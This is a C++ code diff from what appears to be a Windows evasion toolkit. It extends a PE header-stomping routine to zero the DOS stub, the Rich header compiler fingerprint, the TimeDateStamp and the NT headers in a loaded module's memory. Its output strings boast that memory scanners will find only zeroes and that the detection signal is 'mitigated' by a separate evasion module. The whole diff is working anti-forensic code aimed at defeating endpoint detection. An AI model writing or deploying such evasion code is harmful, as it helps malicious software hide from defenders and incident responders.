@@ -46,18 +46,20 @@ std::string PEStamp::StompFull() {
     if (!Unprotect(base, wipeSize, &old))
         return "PEStamp: VirtualProtect failed (need RW on header page)";
 
-    // Wipe DOS header
-    memset(base, 0, sizeof(IMAGE_DOS_HEADER));
-    // Wipe NT signature + file header + optional header
+    // Wipe everything from base to end of NT headers:
+    // - DOS header (0x00..0x3F)
+    // - DOS stub + Rich header (0x40..e_lfanew-1)  ← compiler fingerprint lives here
+    // - NT signature + file header + optional header (e_lfanew..+sizeof NT_HEADERS)
+    // The TimeDateStamp is inside FileHeader so it is also zeroed here.
+    memset(base, 0, e_lfanew);
     memset(base + e_lfanew, 0, sizeof(IMAGE_NT_HEADERS));
 
     Reprotect(base, wipeSize, old);
 
-    return "PEStamp: Full headers wiped (DOS + NT headers zeroed)\n"
-           "Memory scanners looking for PE structure in module memory will find\n"
-           "only zeroes — no MZ, no PE\\0\\0, no machine type, no section count.\n"
-           "The process continues executing normally (headers not needed post-load).\n"
-           "Detection: VirtualProtect(module_base) call = high-confidence EDR signal.";
+    return "PEStamp: Full headers wiped (DOS stub + Rich header + NT headers zeroed)\n"
+           "Rich header compiler fingerprint and PE TimeDateStamp are gone from memory.\n"
+           "Memory scanners will find only zeroes — no MZ, PE\\0\\0, machine type or Rich.\n"
+           "Detection: VirtualProtect(module_base) = EDR signal (mitigated by Evasion::RunAll).";
 }
 
 std::string PEStamp::RestoreHeaders() {
